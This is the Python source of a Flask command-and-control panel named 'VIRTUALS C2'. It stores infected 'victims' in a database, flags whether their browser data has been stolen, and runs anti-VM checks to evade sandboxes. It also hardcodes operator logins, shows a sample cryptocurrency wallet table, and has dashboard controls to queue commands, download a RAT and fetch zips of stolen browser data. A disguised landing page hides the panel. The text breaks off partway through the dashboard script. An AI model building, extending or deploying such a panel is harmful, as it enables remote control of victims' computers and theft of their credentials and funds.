"""
VIRTUALS C2 - PERSISTENT VICTIMS
Victims Never Disappear · Full Permissions · All Features Working
BY: YOUR STAR BESTIE
"""

from flask import Flask, request, jsonify, send_file, session, redirect, url_for
import sqlite3
import datetime
import random
import json
import os
import platform
import subprocess
import re
import uuid
import threading
import time
import shutil
import zipfile
import hashlib
from io import BytesIO
from werkzeug.utils import secure_filename
from functools import wraps

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024
app.config['SECRET_KEY'] = 'virtuals_c2_secret_key_2024'

PORT = int(os.environ.get('PORT', 8080))

# ============================================
# USER CREDENTIALS & PERMISSIONS
# ============================================
USERS = {
    "adam": {"password": "virtuals2024", "role": "viewer", "color": "#44aaff", "can_chat": False},
    "jerry": {"password": "virtuals2024", "role": "operator", "color": "#ff8844", "can_chat": True},
    "haunt": {"password": "virtuals2024", "role": "viewer", "color": "#aa88ff", "can_chat": False},
    "owner": {"password": "whiteknight", "role": "owner", "color": "#ffd700", "can_chat": True}
}

CHAT_USERS = ["jerry", "owner"]

# ============================================
# FOLDERS
# ============================================
folders = ['screenshots', 'logs', 'uploads', 'browser_data', 'dist', 'browser_zips', 'channels']
for folder in folders:
    os.makedirs(folder, exist_ok=True)

# ============================================
# DATABASE
# ============================================
def get_db():
    conn = sqlite3.connect('virtuals_c2.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY, pc TEXT, ip TEXT, os TEXT, status TEXT, 
        is_vm INTEGER DEFAULT 0, vm_details TEXT, first_seen TEXT, last_seen TEXT,
        activity TEXT DEFAULT 'idle', browser_data_stolen INTEGER DEFAULT 0,
        is_test INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, command TEXT, 
        result TEXT, timestamp TEXT, status TEXT DEFAULT 'pending',
        user TEXT DEFAULT 'unknown'
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, type TEXT,
        content TEXT, timestamp TEXT, user TEXT DEFAULT 'system'
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS notifications (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, title TEXT,
        content TEXT, timestamp TEXT, read INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT,
        role TEXT, last_login TEXT, last_ip TEXT, current_activity TEXT DEFAULT 'idle',
        can_chat INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS login_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, ip TEXT,
        timestamp TEXT, success INTEGER DEFAULT 1
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS victim_chat (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, sender TEXT,
        message TEXT, timestamp TEXT, is_from_victim INTEGER DEFAULT 0
    )''')
    for username, info in USERS.items():
        c.execute("INSERT OR IGNORE INTO users (username, password, role, can_chat) VALUES (?, ?, ?, ?)",
                 (username, hashlib.md5(info['password'].encode()).hexdigest(), info['role'], 1 if info['can_chat'] else 0))
    conn.commit()
    return conn

# ============================================
# CREATE PERSISTENT TEST VICTIMS
# ============================================
def create_test_victims():
    conn = get_db()
    c = conn.cursor()
    test_victims = [
        {"id": "DESKTOP-ALPHA", "pc": "DESKTOP-ALPHA", "ip": "192.168.1.10", "os": "Windows 10 Pro", "is_vm": 0, "activity": "idle", "browser_data_stolen": 1, "is_test": 1},
        {"id": "LAPTOP-BETA", "pc": "LAPTOP-BETA", "ip": "192.168.1.11", "os": "Windows 11 Pro", "is_vm": 0, "activity": "typing", "browser_data_stolen": 0, "is_test": 1},
        {"id": "WORKSTATION-GAMMA", "pc": "WORKSTATION-GAMMA", "ip": "192.168.1.12", "os": "Windows 10 Pro", "is_vm": 0, "activity": "reading", "browser_data_stolen": 0, "is_test": 1},
        {"id": "VM-TEST-01", "pc": "VM-TEST-01", "ip": "192.168.1.13", "os": "Windows 10 Pro", "is_vm": 1, "activity": "idle", "browser_data_stolen": 1, "is_test": 1},
        {"id": "DESKTOP-DELTA", "pc": "DESKTOP-DELTA", "ip": "192.168.1.14", "os": "Windows 11 Pro", "is_vm": 0, "activity": "processing", "browser_data_stolen": 0, "is_test": 1}
    ]
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    for v in test_victims:
        c.execute("INSERT OR REPLACE INTO victims (id, pc, ip, os, status, is_vm, first_seen, last_seen, activity, browser_data_stolen, is_test) VALUES (?, ?, ?, ?, 'Online', ?, ?, ?, ?, ?, ?)",
                 (v['id'], v['pc'], v['ip'], v['os'], v['is_vm'], now, now, v['activity'], v['browser_data_stolen'], v['is_test']))
    conn.commit()
    conn.close()

# Run on startup
create_test_victims()

# ============================================
# HEARTBEAT CLEANER - KEEPS TEST VICTIMS
# ============================================
def cleanup_heartbeats():
    while True:
        time.sleep(10)
        try:
            conn = get_db()
            c = conn.cursor()
            # Only mark non-test victims as offline
            cutoff = datetime.datetime.now() - datetime.timedelta(seconds=20)
            cutoff_str = cutoff.strftime("%Y-%m-%d %H:%M:%S")
            c.execute("UPDATE victims SET status = 'Offline' WHERE last_seen < ? AND status = 'Online' AND is_test = 0", (cutoff_str,))
            # Ensure test victims stay Online
            c.execute("UPDATE victims SET status = 'Online' WHERE is_test = 1")
            conn.commit()
            conn.close()
        except:
            pass

threading.Thread(target=cleanup_heartbeats, daemon=True).start()

# ============================================
# VM DETECTION
# ============================================
class VMDetector:
    @staticmethod
    def check_all():
        checks = {
            'registry': VMDetector.check_registry(),
            'processes': VMDetector.check_processes(),
            'hardware': VMDetector.check_hardware(),
            'files': VMDetector.check_files(),
            'memory': VMDetector.check_memory(),
            'network': VMDetector.check_network(),
            'disk': VMDetector.check_disk()
        }
        hits = sum(1 for v in checks.values() if v)
        return {'is_vm': hits >= 4, 'confidence': min(100, int((hits / 7) * 100)), 'safe_mode': True}
    
    @staticmethod
    def check_registry():
        try:
            import winreg
            indicators = ['VMware', 'VirtualBox', 'QEMU', 'Hyper-V']
            keys = [(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SystemInformation", "SystemManufacturer")]
            for hkey, subkey, value in keys:
                try:
                    key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_READ)
                    val, _ = winreg.QueryValueEx(key, value)
                    return any(i.lower() in str(val).lower() for i in indicators)
                except:
                    pass
        except:
            pass
        return False
    
    @staticmethod
    def check_processes():
        try:
            procs = ['vmtoolsd.exe', 'vmwaretray.exe', 'vboxservice.exe']
            for p in procs:
                try:
                    r = subprocess.run(['tasklist', '/FI', f'IMAGENAME eq {p}'], 
                                      capture_output=True, text=True, timeout=3)
                    if p in r.stdout:
                        return True
                except:
                    pass
        except:
            pass
        return False
    
    @staticmethod
    def check_hardware():
        try:
            cpu = platform.processor()
            return cpu and any(x in cpu.lower() for x in ['virtual', 'vmware', 'qemu'])
        except:
            return False
    
    @staticmethod
    def check_files():
        try:
            files = ['C:\\Program Files\\VMware\\VMware Tools\\', 'C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\']
            return any(os.path.exists(f) for f in files)
        except:
            return False
    
    @staticmethod
    def check_memory():
        try:
            import psutil
            return psutil.virtual_memory().total / (1024**3) < 4
        except:
            return False
    
    @staticmethod
    def check_network():
        try:
            mac = uuid.getnode()
            prefixes = ['000569', '000c29', '001c42', '005056', '080027']
            return any(p in format(mac, '012x') for p in prefixes)
        except:
            return False
    
    @staticmethod
    def check_disk():
        try:
            import psutil
            for p in psutil.disk_partitions():
                if p.mountpoint in ('C:\\', '/'):
                    return psutil.disk_usage(p.mountpoint).total / (1024**3) < 50
        except:
            return False

# ============================================
# SAMPLE WALLET DATA
# ============================================
SAMPLE_WALLETS = {
    "BTC": {"balance": 2.45, "usd": 245000},
    "ETH": {"balance": 15.8, "usd": 63200},
    "LTC": {"balance": 128.5, "usd": 19275},
    "SOL": {"balance": 450.2, "usd": 81036},
    "XMR": {"balance": 892.7, "usd": 169613}
}

# ============================================
# LOGIN DECORATOR
# ============================================
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login_page'))
        return f(*args, **kwargs)
    return decorated

def chat_permission_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return jsonify({'error': 'Not logged in'}), 401
        username = session.get('username')
        if username not in CHAT_USERS:
            return jsonify({'error': 'Permission denied - chat only for operators'}), 403
        return f(*args, **kwargs)
    return decorated

# ============================================
# HTML - LANDING PAGE
# ============================================
LANDING_PAGE = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>VIRTUALS C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#0a0a0f,#1a0a2e);color:#c8c8d0;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;position:relative}
.landing-container{text-align:center}
.landing-container h1{color:#e8e8f0;font-size:72px;font-weight:100;letter-spacing:8px;opacity:0.6}
.landing-container h1 span{color:#446688}
.landing-container .sub{color:#555568;font-size:18px;margin-top:10px;letter-spacing:4px}
.landing-container .sub .status{color:#44dd88}
.question-mark{position:fixed;bottom:30px;right:30px;width:50px;height:50px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:24px;color:#666680;cursor:pointer;transition:0.3s;text-decoration:none;z-index:100}
.question-mark:hover{background:rgba(255,255,255,0.1);border-color:rgba(255,255,255,0.15);color:#e8e8f0}
</style>
</head>
<body>
<div class="landing-container">
<h1>◈ VIRTUALS <span>C2</span></h1>
<div class="sub"><span class="status">●</span> HELLO NOTHING HAPPENS HERE</div>
</div>
<a href="/login" class="question-mark">?</a>
</body>
</html>
'''

# ============================================
# HTML - LOGIN PAGE
# ============================================
LOGIN_PAGE = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>VIRTUALS C2 - Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#0a0a0f,#1a0a2e);color:#c8c8d0;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center}
.login-container{background:rgba(10,10,18,0.85);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.08);border-radius:16px;padding:40px;width:400px;max-width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
.login-container h1{color:#e8e8f0;font-size:28px;font-weight:300;text-align:center;letter-spacing:4px;margin-bottom:5px}
.login-container h1 span{color:#446688}
.login-container .sub{color:#666680;text-align:center;font-size:13px;margin-bottom:30px}
.login-container .sub .status{color:#44dd88}
.login-container label{color:#8888a0;font-size:13px;display:block;margin-bottom:5px}
.login-container input{width:100%;padding:14px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:8px;color:#e8e8f0;font-size:16px;outline:none;margin-bottom:15px;transition:0.3s}
.login-container input:focus{border-color:rgba(68,170,255,0.4)}
.login-container input::placeholder{color:#444458}
.login-container button{width:100%;padding:14px;background:rgba(68,170,255,0.15);border:1px solid rgba(68,170,255,0.2);border-radius:8px;color:#88ccdd;font-size:17px;cursor:pointer;transition:0.3s;font-weight:600}
.login-container button:hover{background:rgba(68,170,255,0.25)}
.login-container .error{color:#cc8888;text-align:center;margin-top:10px;display:none;font-size:14px}
.login-container .back-link{text-align:center;margin-top:15px;font-size:12px;color:#555568}
.login-container .back-link a{color:#666680;text-decoration:none;transition:0.3s}
.login-container .back-link a:hover{color:#88aacc}
</style>
</head>
<body>
<div class="login-container">
<h1>◈ VIRTUALS <span>C2</span></h1>
<div class="sub"><span class="status">●</span> Control Panel Login</div>
<form onsubmit="login(event)">
<label>Username</label>
<input type="text" id="username" placeholder="Enter username" required>
<label>Password</label>
<input type="password" id="password" placeholder="Enter password" required>
<button type="submit">Access Panel</button>
<div class="error" id="errorMsg">Invalid credentials</div>
</form>
<div class="back-link"><a href="/">← Back</a></div>
</div>
<script>
function login(e){e.preventDefault();const u=document.getElementById('username').value;const p=document.getElementById('password').value;fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>r.json()).then(d=>{if(d.success){window.location.href='/dashboard';}else{document.getElementById('errorMsg').style.display='block';}}).catch(()=>{document.getElementById('errorMsg').style.display='block';});}
</script>
</body>
</html>
'''

# ============================================
# HTML - DASHBOARD (VICTIMS INSTEAD OF CHANNELS)
# ============================================
DASHBOARD = '''
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VIRTUALS C2 - Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:100vh;overflow:hidden;font-size:15px;position:relative}
::-webkit-scrollbar{width:4px;height:4px}
::-webkit-scrollbar-track{background:rgba(255,255,255,0.02)}
::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.12);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,0.25)}
#space-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none;overflow:hidden;background:radial-gradient(ellipse at center,#0d0d1a 0%,#07070d 100%)}
.star{position:absolute;background:white;border-radius:50%;opacity:0;animation:twinkle var(--duration) infinite}
.star-layer-1{width:2px;height:2px}
.star-layer-2{width:1.5px;height:1.5px}
.star-layer-3{width:1px;height:1px}
@keyframes twinkle{0%{opacity:0;transform:scale(0.5)}50%{opacity:0.8;transform:scale(1)}100%{opacity:0;transform:scale(0.5)}}
.glass{background:rgba(10,10,18,0.85);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.06);border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.3);position:relative;z-index:1}
.header{background:rgba(10,10,18,0.92);backdrop-filter:blur(12px);padding:8px 16px;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;justify-content:space-between;align-items:center;height:46px;flex-shrink:0;z-index:10;position:relative}
.header h1{color:#e8e8f0;font-size:18px;font-weight:300;letter-spacing:3px}
.header h1 span{color:#446688}
.header .user-info{display:flex;align-items:center;gap:8px;color:#8888a0;font-size:12px}
.header .user-info .username{color:#e8e8f0;font-weight:500}
.header .owner-icon{color:#ffd700;cursor:pointer;font-size:20px;margin-left:6px;transition:0.3s;display:none}
.header .owner-icon:hover{transform:rotate(90deg);color:#ffed4a}
.header .stats{display:flex;gap:14px;align-items:center}
.header .stats .stat-item{color:#8888a0;font-size:12px}
.header .stats .stat-item .num{color:#e8e8f0;font-weight:600;font-size:16px;margin-left:3px}
.header .logout-btn{background:rgba(200,60,60,0.12);color:#cc8888;border:1px solid rgba(200,60,60,0.15);padding:4px 14px;border-radius:4px;cursor:pointer;font-size:12px;transition:0.2s}
.header .logout-btn:hover{background:rgba(200,60,60,0.2)}
.notification-bell{position:relative;cursor:pointer;font-size:17px;color:#8888a0;transition:0.2s;margin-right:6px}
.notification-bell:hover{color:#e8e8f0}
.notification-bell .badge{position:absolute;top:-6px;right:-6px;background:#ff4444;color:#fff;font-size:8px;padding:1px 5px;border-radius:8px;min-width:15px;text-align:center}
.notification-dropdown{position:absolute;top:38px;right:0;width:280px;max-height:260px;background:rgba(10,10,18,0.95);backdrop-filter:blur(12px);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:6px;overflow-y:auto;display:none;z-index:1000;box-shadow:0 10px 40px rgba(0,0,0,0.5)}
.notification-dropdown .notif-item{padding:5px 8px;border-bottom:1px solid rgba(255,255,255,0.03);border-radius:4px}
.notification-dropdown .notif-item:hover{background:rgba(255,255,255,0.03)}
.notification-dropdown .notif-item .notif-title{color:#88aacc;font-size:12px;font-weight:500}
.notification-dropdown .notif-item .notif-content{color:#8888a0;font-size:11px;margin-top:1px}
.notification-dropdown .notif-item .notif-time{color:#555568;font-size:9px;margin-top:1px}
.owner-panel{position:fixed;top:52px;right:10px;width:340px;max-height:calc(100vh - 70px);background:rgba(10,10,18,0.96);backdrop-filter:blur(20px);border:1px solid rgba(255,215,0,0.2);border-radius:10px;padding:12px;overflow-y:auto;display:none;z-index:1000;box-shadow:0 10px 50px rgba(0,0,0,0.9)}
.owner-panel .panel-title{color:#ffd700;font-size:14px;font-weight:600;border-bottom:1px solid rgba(255,215,0,0.1);padding-bottom:8px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center}
.owner-panel .panel-title .live-dot{display:inline-block;width:8px;height:8px;background:#44dd88;border-radius:50%;animation:pulse 1.5s infinite;margin-left:6px}
.owner-panel .section-title{color:#8888a0;font-size:10px;text-transform:uppercase;letter-spacing:1px;margin-top:8px;margin-bottom:4px}
.owner-panel .user-item{display:flex;justify-content:space-between;padding:4px 6px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;border-radius:4px}
.owner-panel .user-item:hover{background:rgba(255,255,255,0.03)}
.owner-panel .user-item .user-name{color:#e8e8f0;font-weight:500}
.owner-panel .user-item .user-ip{color:#8888a0;font-size:11px}
.owner-panel .user-item .user-role{font-size:10px;padding:0 6px;border-radius:10px}
.owner-panel .user-item .user-role.owner{color:#ffd700;background:rgba(255,215,0,0.1)}
.owner-panel .user-item .user-role.user{color:#44aaff;background:rgba(68,170,255,0.1)}
.owner-panel .user-item .user-activity{color:#666680;font-size:10px;font-style:italic}
.owner-panel .close-btn{color:#8888a0;cursor:pointer;font-size:16px;transition:0.3s}
.owner-panel .close-btn:hover{color:#e8e8f0}
.owner-panel .online-count{color:#44dd88;font-size:12px;font-weight:400}
.container{display:flex;height:calc(100vh - 46px);padding:5px;gap:5px;position:relative;z-index:1}
.victims-panel{width:170px;min-width:170px;display:flex;flex-direction:column;gap:4px;height:100%}
.victims-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;padding:5px 8px;border-bottom:1px solid rgba(255,255,255,0.04);flex-shrink:0}
.victim-list{flex:1;overflow-y:auto;padding:3px}
.victim-item{display:flex;align-items:center;padding:4px 8px;margin:1px 0;border-radius:4px;cursor:pointer;transition:0.15s;border-left:2px solid transparent}
.victim-item:hover{background:rgba(255,255,255,0.04)}
.victim-item.active{background:rgba(68,170,255,0.08);border-left-color:#44aaff}
.victim-item .status-dot{width:6px;height:6px;border-radius:50%;margin-right:6px;flex-shrink:0}
.victim-item .status-dot.online{background:#44dd88;animation:pulse 2s infinite}
.victim-item .status-dot.offline{background:#664444}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
.victim-item .name{color:#e8e8f0;font-size:12px;flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.victim-item .badge{background:rgba(200,60,60,0.12);color:#cc8888;font-size:7px;padding:0 5px;border-radius:6px;line-height:13px;height:13px;flex-shrink:0;margin-left:4px}
.victim-item .activity{color:#666680;font-size:8px;margin-left:4px;font-style:italic;flex-shrink:0}
.middle-panel{flex:1;display:flex;flex-direction:column;gap:5px;min-width:200px;height:100%}
.chat-panel{padding:6px 10px;flex:1;display:flex;flex-direction:column;min-height:0}
.chat-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:3px;margin-bottom:4px;flex-shrink:0;display:flex;justify-content:space-between;align-items:center}
.chat-panel .panel-title .victim-name{color:#88aacc;font-weight:500}
.chat-messages{background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.04);border-radius:5px;padding:5px 8px;flex:1;overflow-y:auto;min-height:100px;font-size:13px;line-height:1.6}
.chat-messages .msg{padding:1px 0;border-bottom:1px solid rgba(255,255,255,0.02)}
.chat-messages .time{color:#555568;margin-right:4px;font-size:10px}
.chat-messages .sender{font-weight:600;font-size:13px}
.chat-messages .sender.us{color:#66ddbb}
.chat-messages .sender.victim{color:#ddbb88}
.chat-messages .sender.system{color:#8888aa}
.chat-messages .sender.embed{color:#ffd700}
.chat-messages .sender.user{color:#44aaff}
.chat-input-area{display:flex;gap:5px;margin-top:5px;flex-shrink:0}
.chat-input-area input{flex:1;padding:7px 14px;background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.05);border-radius:5px;color:#c8c8d0;font-family:inherit;font-size:16px;outline:none;min-height:38px}
.chat-input-area input:focus{border-color:rgba(255,255,255,0.12)}
.chat-input-area input::placeholder{color:#444458;font-size:14px}
.chat-input-area button{padding:7px 20px;background:rgba(255,255,255,0.04);color:#b0b0c0;border:1px solid rgba(255,255,255,0.06);border-radius:5px;cursor:pointer;font-family:inherit;font-size:15px;transition:0.15s;min-height:38px}
.chat-input-area button:hover{background:rgba(255,255,255,0.08);color:#e8e8f0}
.file-upload-area{display:flex;gap:5px;margin-top:4px;flex-shrink:0;flex-wrap:wrap;align-items:center}
.file-upload-area input[type="file"]{flex:1;padding:4px 10px;background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.04);border-radius:5px;color:#c8c8d0;font-size:14px;min-width:60px;min-height:34px}
.file-upload-area input[type="file"]::file-selector-button{padding:4px 12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:4px;color:#b0b0c0;cursor:pointer;font-size:13px;margin-right:10px}
.file-upload-area input[type="file"]::file-selector-button:hover{background:rgba(255,255,255,0.08)}
.file-upload-area button{padding:4px 16px;background:rgba(50,180,200,0.1);color:#88ccdd;border:1px solid rgba(50,180,200,0.15);border-radius:5px;cursor:pointer;font-size:14px;transition:0.15s;min-height:34px}
.file-upload-area button:hover{background:rgba(50,180,200,0.18)}
.file-upload-area #fileName{color:#555568;font-size:13px;max-width:80px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.upload-progress{width:100%;height:2px;background:rgba(255,255,255,0.04);border-radius:1px;margin-top:2px;overflow:hidden;display:none}
.upload-progress .bar{height:100%;background:linear-gradient(90deg,#44dd88,#88ccdd);width:0%;transition:width 0.3s}
.download-section{display:flex;gap:6px;margin-top:4px;flex-shrink:0;flex-wrap:wrap}
.download-section button{background:rgba(50,180,120,0.12);color:#66ddbb;border:1px solid rgba(50,180,120,0.15);padding:5px 16px;border-radius:5px;cursor:pointer;font-size:14px;transition:0.15s;min-height:34px}
.download-section button:hover{background:rgba(50,180,120,0.2)}
.download-section .zip-btn{background:rgba(50,180,200,0.12);color:#88ccdd;border:1px solid rgba(50,180,200,0.15)}
.download-section .zip-btn:hover{background:rgba(50,180,200,0.2)}
.right-panel{width:240px;min-width:200px;display:flex;flex-direction:column;gap:5px;height:100%}
.details-panel{padding:6px 10px;height:50%;overflow-y:auto;flex-shrink:0}
.details-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:3px;margin-bottom:4px}
.detail-item{padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:12px;display:flex;justify-content:space-between}
.detail-item .label{color:#555568}
.detail-item .value{color:#e8e8f0;font-weight:500}
.detail-item .value.online{color:#66dd88}
.detail-item .value.offline{color:#886666}
.screenshot-gallery{display:flex;flex-wrap:wrap;gap:3px;margin-top:3px}
.screenshot-thumb{width:42px;height:30px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:3px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:8px;color:#555568;transition:0.15s}
.screenshot-thumb:hover{border-color:rgba(255,255,255,0.12)}
.logs-panel{padding:6px 10px;flex:1;overflow-y:auto;min-height:0}
.logs-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:3px;margin-bottom:3px}
.log-item{padding:1px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:10px;display:flex;gap:3px;opacity:0.9}
.log-item .type{padding:0 3px;border-radius:2px;font-size:6px;text-transform:uppercase;flex-shrink:0;font-weight:600;margin-top:1px}
.log-item .type.success{background:rgba(50,180,120,0.2);color:#66ddbb}
.log-item .type.failed{background:rgba(180,50,50,0.2);color:#cc8888}
.log-item .type.info{background:rgba(68,170,255,0.12);color:#44aaff}
.log-item .type.system{background:rgba(136,136,170,0.12);color:#8888aa}
.log-item .log-time{color:#444458;font-size:8px;flex-shrink:0}
.log-item .log-content{color:#b0b0c0;font-size:10px}
.embed-box{background:rgba(0,0,0,0.2);border-left:3px solid var(--embed-color,#44aaff);border-radius:3px;padding:4px 6px;margin:2px 0}
.embed-box .embed-title{font-size:13px;font-weight:600;color:#e8e8f0}
.embed-box .embed-content{font-size:12px;color:#b0b0c0;white-space:pre-wrap;margin-top:1px}
.embed-box .embed-footer{font-size:9px;color:#555568;margin-top:1px}
@media(max-width:1024px){.victims-panel{width:140px;min-width:140px}.right-panel{width:200px;min-width:160px}.owner-panel{width:290px;right:5px}}
@media(max-width:768px){.container{flex-direction:column}.victims-panel{width:100%;min-width:100%;height:auto;max-height:80px}.victim-list{display:flex;flex-wrap:wrap;gap:3px;padding:3px}.victim-item{min-width:70px}.right-panel{width:100%;min-width:100%;flex-direction:row}.details-panel{height:auto;max-height:150px;width:50%}.logs-panel{height:auto;max-height:150px;width:50%}.owner-panel{width:calc(100% - 20px);right:10px;top:52px}}
</style>
</head>
<body>
<div id="space-bg"></div>
<div class="header">
<h1>◈ VIRTUALS <span>C2</span></h1>
<div style="display:flex;align-items:center;gap:8px;">
<div class="notification-bell" onclick="toggleNotifications()" id="bellBtn">
🔔
<span class="badge" id="notifBadge" style="display:none;">0</span>
<div class="notification-dropdown" id="notifDropdown">
<div style="color:#666680;font-size:10px;padding:4px 8px;border-bottom:1px solid rgba(255,255,255,0.04);">Notifications</div>
<div id="notifList"><div style="color:#555568;font-size:11px;padding:8px;text-align:center;">No notifications</div></div>
</div>
</div>
<div class="user-info">
<span class="username" id="currentUser">guest</span>
<span class="owner-icon" id="ownerIcon" onclick="toggleOwnerPanel()">◈</span>
</div>
<div class="stats">
<span class="stat-item">VICTIMS <span class="num" id="victimCount">0</span></span>
<span class="stat-item">ONLINE <span class="num" id="onlineCount">0</span></span>
<span class="stat-item">VMS <span class="num" id="vmCount">0</span></span>
</div>
<button class="logout-btn" onclick="logout()">Logout</button>
</div>
</div>
<div class="owner-panel" id="ownerPanel">
<div class="panel-title">
◈ OWNER PANEL <span class="live-dot"></span> <span class="online-count" id="ownerOnlineCount">0 online</span>
<span class="close-btn" onclick="toggleOwnerPanel()">✕</span>
</div>
<div class="section-title">👤 Users Online & IPs</div>
<div id="activeUsers"><div style="color:#555568;font-size:12px;padding:8px;">Loading users...</div></div>
<div class="section-title">📋 Login History</div>
<div id="loginLogs"><div style="color:#555568;font-size:12px;padding:8px;">Loading logs...</div></div>
<div class="section-title">📊 Command Activity</div>
<div id="commandStats"><div style="color:#555568;font-size:12px;padding:8px;">Loading stats...</div></div>
</div>
<div class="container">
<div class="victims-panel glass">
<div class="panel-title">VICTIMS</div>
<div class="victim-list" id="victimList">
<div style="color:#555568;font-size:12px;text-align:center;padding:12px;">No victims</div>
</div>
</div>
<div class="middle-panel">
<div class="chat-panel glass">
<div class="panel-title">CONSOLE <span class="victim-name" id="currentVictim">#general</span></div>
<div class="chat-messages" id="chatMessages"><div class="msg"><span class="time">[system]</span><span class="sender system">virtuals</span> ready</div></div>
<div class="chat-input-area"><input id="chatInput" placeholder="/command or message" onkeypress="if(event.key==='Enter')sendMessage()"><button onclick="sendMessage()">send</button></div>
<div class="file-upload-area">
<input type="file" id="fileInput" onchange="document.getElementById('fileName').textContent=this.files[0]?this.files[0].name:'no file'">
<span id="fileName">no file</span>
<button onclick="uploadFile()">upload</button>
</div>
<div class="upload-progress" id="uploadProgress"><div class="bar" id="progressBar"></div></div>
<div class="download-section">
<button onclick="window.open('/download-rat','_blank')">RAT</button>
<button class="zip-btn" onclick="downloadBrowserZip()">Browser Zip</button>
</div>
</div>
</div>
<div class="right-panel">
<div class="details-panel glass">
<div class="panel-title">DETAILS</div>
<div id="victimDetails"><div style="color:#555568;font-size:12px;text-align:center;padding:10px;">Select a victim</div></div>
<div style="margin-top:4px;border-top:1px solid rgba(255,255,255,0.04);padding-top:4px;">
<div style="color:#666680;font-size:8px;text-transform:uppercase;letter-spacing:1px;">Screenshots</div>
<div class="screenshot-gallery" id="screenshotGallery"><div style="color:#555568;font-size:10px;">none</div></div>
</div>
</div>
<div class="logs-panel glass">
<div class="panel-title">LOGS</div>
<div id="logOutput"><div style="color:#555568;font-size:11px;">no logs</div></div>
</div>
</div>
</div>
<script>
let state={victims:{},activeVictim:'general',commands:{},cmdCount:0,notifications:[],isOwner:false};
let currentUser = 'guest';
let canChat = false;

function getUserInfo(){fetch('/api/get_user').then(r=>r.json()).then(d=>{if(d.success){document.getElementById('currentUser').textContent=d.username;currentUser=d.username;canChat=d.can_chat;if(d.role==='owner'){document.getElementById('ownerIcon').style.display='inline-block';state.isOwner=true;refreshOwnerPanel();}}});}
function logout(){fetch('/api/logout',{method:'POST'}).then(()=>window.location.href='/');}
function api(a,d,c){fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:a,...d})}).then(r=>r.json()).then(c).catch(()=>{});}
